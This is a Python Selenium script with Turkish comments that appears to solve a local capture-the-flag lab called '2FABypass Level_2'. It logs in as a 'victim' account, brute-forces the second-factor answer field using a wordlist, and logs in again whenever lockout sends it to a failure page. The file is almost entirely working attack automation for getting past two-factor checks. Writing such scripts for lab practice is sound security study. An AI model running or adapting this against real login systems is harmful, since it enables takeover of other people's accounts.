import os
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchWindowException
import time

# Şu anki betiğin bulunduğu klasörü al
current_directory = os.path.dirname(os.path.abspath(__file__))

# Dosyanın tam yolunu oluştur
file_path = os.path.join(current_directory, "answer.txt")

# Tarayıcıyı başlat
driver = webdriver.Chrome()

# answer.txt dosyasından kavramları oku
kavramlar = []
with open(file_path, "r") as file:
    kavramlar = file.read().splitlines()

sayac = 0  # Kavramları denemek için sayaç

def login():
    global driver  # driver'ı global bir değişken olarak tanımla
    try:
        # Login sayfasına git
        driver.get("http://localhost/php/2FABypass/Level_2/login.php")
        
        # E-posta ve şifre bilgilerini doldur
        mail_input = driver.find_element(By.ID, "mail")
        pass_input = driver.find_element(By.ID, "pass")
        mail_input.send_keys("victim@gmail.com")
        pass_input.send_keys("pass")

        # Login butonuna tıkla
        driver.find_element(By.CLASS_NAME, "input-submit").click()
    except NoSuchWindowException as e:
        print(f"Hata: {e}")
        # Tarayıcı penceresi zaten kapalıysa, yeni bir tarayıcı penceresi oluşturun
        driver = webdriver.Chrome()

# Login yap
login()

while True:
    if "confirmCode.php" in driver.current_url:
        for i in range(sayac, sayac + 3):  # Sayac ile bir sonraki 3 kavramı seç
            if i < len(kavramlar):
                kavram = kavramlar[i]
                try:
                    answer_input = driver.find_element(By.ID, "answer")
                    answer_input.clear()
                    answer_input.send_keys(kavram)
                    driver.find_element(By.CLASS_NAME, "input-submit").click()
                    time.sleep(1)
                    print(f"Denenen kavram: {kavram}")
                except:
                    print(f"Hata! Kavram girişi sırasında bir sorun oluştu: {kavram}")
        sayac += 3  # 3 kavramı denediğimiz için sayaçı güncelle

    if "badEnding.php" in driver.current_url:
        # Hata durumunda, badEnding.php sayfasına yönlendirildi
        # Login yaparak işlemlere yeniden başla
        print("Hata! badEnding.php sayfasına yönlendirildi. Yeniden giriş yapılıyor...")
        login()  # Yeniden giriş yap
    elif "goodEnding.php" in driver.current_url:
        print("Yarışmayı kazandınız!")
        break  # Kazandıktan sonra döngüyü kır

# Tarayıcıyı kapat
driver.quit()
